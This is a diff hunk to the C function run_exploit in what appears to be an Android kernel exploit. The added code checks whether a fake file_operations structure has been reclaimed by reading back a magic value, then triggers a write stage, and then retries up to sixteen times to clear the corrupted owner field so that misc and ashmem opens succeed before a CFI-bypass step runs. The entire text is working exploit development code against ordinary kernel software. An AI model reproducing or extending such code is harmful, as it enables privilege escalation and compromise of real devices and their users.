@@ -589,6 +589,42 @@ int run_exploit(int argc, char **argv) {
     int triggered = app_trigger_fops_slide_route();
     pr_info("app fops stage=trigger-return attempt=%d triggered=%d\n",
             attempt, triggered);
+    if (triggered && getenv("DIRECT_FOPS_PROBE")) {
+      uint64_t seen = 0;
+      int read_ok = slide_bootid_read64(&seen);
+      pr_info("fops reclaim probe read_ok=%d value=%016llx want=%016llx\n",
+              read_ok, (unsigned long long)seen,
+              (unsigned long long)FOPS_RECLAIM_PROBE_MAGIC);
+      unsetenv("DIRECT_FOPS_PROBE");
+      if (read_ok && seen == FOPS_RECLAIM_PROBE_MAGIC) {
+        SYSCHK(setenv("DIRECT_FOPS_WRITE", "1", 1));
+        triggered = app_trigger_fops_slide_route();
+        pr_info("fops reclaim hit; write triggered=%d\n", triggered);
+      } else {
+        pr_info("fops reclaim miss; skip misc_fops write\n");
+        triggered = 0;
+      }
+    }
+    if (triggered && getenv("DIRECT_FOPS_WRITE")) {
+      /* rb_erase wrote parent into fake_fops->owner. misc_open then
+       * fops_get() fails (ENODEV). Zero owner with a leafless erase. */
+      SYSCHK(setenv("DIRECT_FOPS_OWNER_CLEAR", "1", 1));
+      unsetenv("DIRECT_FOPS_WRITE");
+      int cleared = 0;
+      for (int clr = 1; clr <= 16; clr++) {
+        if (app_trigger_fops_slide_route()) {
+          pr_info("fops owner-clear fired attempt=%d parent=%016zx\n",
+                  clr, fake_fops);
+          cleared = 1;
+          break;
+        }
+        pr_info("fops owner-clear miss attempt=%d/16\n", clr);
+      }
+      unsetenv("DIRECT_FOPS_OWNER_CLEAR");
+      if (!cleared) {
+        pr_warning("fops owner still non-NULL; ashmem open will ENODEV\n");
+      }
+    }
     int verified = triggered && try_cfi_stage();
     pr_info("app fops slide attempt=%d/1 triggered=%d verified=%d "
             "step=%d errno=%d\n",
